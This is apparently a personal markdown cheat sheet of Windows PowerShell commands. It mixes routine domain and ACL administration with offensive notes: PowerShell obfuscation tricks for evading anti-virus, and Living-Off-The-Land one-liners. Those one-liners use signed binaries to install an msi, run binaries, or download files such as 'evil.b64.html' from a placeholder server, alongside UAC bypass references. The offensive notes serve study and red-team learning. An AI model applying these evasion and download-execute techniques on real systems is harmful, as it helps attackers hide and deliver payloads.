# Powershell Commands
## Discover DHCP Servers:
```Powershell
Get-DhcpServerInDC
```
## Get local machine IP info
```Powershell
Get-NetIPConfiguration
```
## List Domain Controllers:
```Powershell
Get-ADDomainController
```
## Determine if this device is the Domain Controller
```Powershell
DsRoleGetPrimaryDomainInformation
```

## List FSMO Rules:
```Powershell
# From Scripting Guys Blog
# https://blogs.technet.microsoft.com/heyscriptingguy/2014/11/28/powertip-use-powershell-to-get-list-of-fsmo-role-holders/
Get-ADDomain | Select-Object InfrastructureMaster, RIDMaster, PDCEmulator
Get-ADForest | Select-Object DomainNamingMaster, SchemaMaster
Get-ADDomainController -Filter * |
Select-Object Name, Domain, Forest, OperationMasterRoles |
Where-Object {$_.OperationMasterRoles} |
Format-Table -AutoSize
```



# Other
https://github.com/CyberPoint/

glinares

Use Cacls.exe to view and manage Windows ACLs
```
Weak ACL Permissions:
Rights     : FullControl
FullPath   : C:\ProgramData\NVIDIA Corporation\GeForce Experience\Update\GFExperience.NvStreamSrv\amd64\server\nvinject.dll
Domain     : Everyone
ID         :
AccessType : Allow
PS: Somebody you should probably look into this ;) just saying
```
```Powershell
Get-Acl | Format-List
Get-Acl -Path * | Format-List
```
Looking for: 
```
Access: BUILTIN\Administrators Allow  FullControl
```
### Get an ACL for a folder:
```Powershell
Get-Acl C:\Windows
```

### Get an ACL for a folder using wildcards
```Powershell
Get-Acl C:\Windows\s*.log | Format-List -Property PSPath, Sddl
```

### Get count of Audit entries for an ACL
```Powershell
Get-Acl C:\Windows\s*.log -Audit | ForEach-Object { $_.Audit.Count }
```

### Get an ACL for a registry key
```Powershell
Get-Acl -Path HKLM:\System\CurrentControlSet\Control | Format-List
```

### Get an ACL using **InputObject**
```Powershell
Get-Acl -InputObject (Get-StorageSubSystem -Name S087)
```







# Run Powershell command from CMD
https://superuser.com/questions/1080239/run-powershell-command-from-cmd
```Powershell
powershell -command " PasteCodeHere "
```
# Run Powershell script from CMD
the & is used to call a File. when you're only using a command & is unnessecary, when you want to call a script, you should use it.
```Powershell
powershell -command "& 'C:\foobar.ps1'"
```
You could also use 
```Powershell
powershell -file C:\file.ps1 to call a script
```





























## PowerShell Script obfuscation
- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [How to Bypass Anti-Virus to Run Mimikatz,2017](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)

### Case-insensitive
```
INvOke-eXpReSsiOn
```
### Alias
```
get-alias 
get-alias iex 
```

```
iex -> Invoke-Expression
sal -> Set-Alias
```

```
set-alias <Name> <Value>
sal ping iex
```
### Dot expression and amp expression(Invoke-Expression)

```
.("get-alias")
&('gal')
iex("GeT-AliAs")
```
### Combining characters
```
'i'+'ex'
```
### Backticks
```
`i`e`x("`gal `gal")
```
### Split method
```
'bob@alice'-split('@') -> bob alice
'bob@alice' -split '@' -split "i" -> bob al ce
```
### Join method
```
"bob","alice" -join "@" -> bob@alice
```
### Concatenation operations
```
"{1} {0}" -f "Alice","Bob" -> Bob Alice
"{1} {0}" -f "Alice",("{1}{2}{0}" -f "b","B","o") -> Bob Alice
```
### No Space
```
"bob","alice"-join"@"
```
### Pipe operator
```
'Write-host 1' | iex
```
### $ENV variable
```
.($seLLId[1]+$shEllId[13]+'x') -> .(iex)
&($EnV:cOmSpEc[4,15,25]-JOIN'') -> &(iex)
```
### Encode
- xor
```
10-bxor"10"  -> 0
"0xa"-bxor10 -> 0
```
- base64
```
[System.Convert]::FromBase64String("Ym9iYWxpY2UK") -> bobalice
```
- zlib
```
New-Object System.IO.Compression.DeflateStream([iO.mEmoRySTream] [sysTEM.ConVert]::frOMBASE64STrING("Ym9iYWxpY2UK"))
```
- unicode
```
[System.Text.Encoding]::Unicode.GetString($unicodeBytes)
```
### Ascii code
```
[string][char[]](0x69,0x65,0x58) -> i e X
```
### Replace method
```
'i e x'-replace ' ','' -> ieX
```
### %(foreach-object)
- foreach-objectの
```
((0x69, 0x65, 0x58) | %{([char] [int] $_)})-jOIN'' -> ieX
```
### Comment out
```
<#bobalice#>
```
**ref:**<br>
[Powershell Static Analysis & Emotet results](https://hatching.io/blog/powershell-analysis)<br>

## Spoofing PE file
    - olympic Destroyer
    - https://securelist.com/the-devils-in-the-rich-header/84348/?utm_source=kdaily&utm_medium=blog&utm_campaign=jp_great_yh0104_organic&utm_content=link&utm_term=jp_kdaily_organic_yh0104_link_blog_great

## Living Off The Land(LOL)
- LOLBinary(LOLBin), Script(LOLScript), Library(LOLLib)
[LOLBAS](https://lolbas-project.github.io/)<br>[GTFOBins(UNIX ver)](https://gtfobins.github.io/)
- LOLBins
> Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
- LOLBins
    - UAC Bypass,AppLocker Bypass,Dumping process memory,Credential theft,Log evasion/modification,Persistence,File operations,etc.
- LOLBins
    - [Certutil.exe](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)
        - (https://lolbas-project.github.io/lolbas/Binaries/Forfiles/)
    - [eventvwr.exe](https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/)
    - [Msbuild.exe](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
    - [Mshta.exe](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
    - [Odbcconf.exe](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)
    - [Regasm.exe](https://lolbas-project.github.io/lolbas/Binaries/Regasm/) 
    - [Regsvcs.exe](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)
    - [Regsvr32.exe](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
    - [Wmic.exe](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
    - Powershell.exe
    - [Bitsadmin.exe](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)
    - Wingding.tff
    - Disk Cleanup
    - werfault.exe
### UAC bypass
### msi install
- devinit.exe
  - VisualStudio
  - `devinit.exe run -t msi-install -i http://server/out.msi`
  - MS
  - https://twitter.com/mrd0x/status/1460815932402679809
### Execute file
- Microsoft.NodejsTools.PressAnyKey.exe
  - `Microsoft.NodejsTools.PressAnyKey.exe normal 1 bin.exe`
  - https://github.com/mrd0x/NodeJSTools_LOLBIN 
  - https://twitter.com/mrd0x/status/1463526834918854661
- mpiexec.exe
  - `mpiexec.exe -n 1 c:\path\to\binary.exe`
  - https://twitter.com/mrd0x/status/1465058133303246867
### Download file
- msedge.exe
  - `start /min msedge.exe https://server/file.exe.zip && timeout 3 && taskkill /IM "msedge.exe" /F`
  - https://twitter.com/mrd0x/status/1478116126005641220
- msedge.exe/chrome.exe
  - `msedge.exe or chrome.exe --headless --enable-logging --disable-gpu --dump-dom "http://server/evil.b64.html" > out.b64`
  - https://twitter.com/mrd0x/status/1478234484881436672

**ref:**
- UAC Bypass
[Bypass User Account Control, MITRE ATT&CK](https://attack.mitre.org/techniques/T1088/)<br>
- UAC Bypass
[UACMe](https://github.com/hfiref0x/UACME)
- fodhelper.exe UAC Bypass，[Trickbot](https://www.bleepingcomputer.com/news/security/trickbot-now-uses-a-windows-10-uac-bypass-to-evade-detection/)(2020-01-16)
[First entry: Welcome and fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)




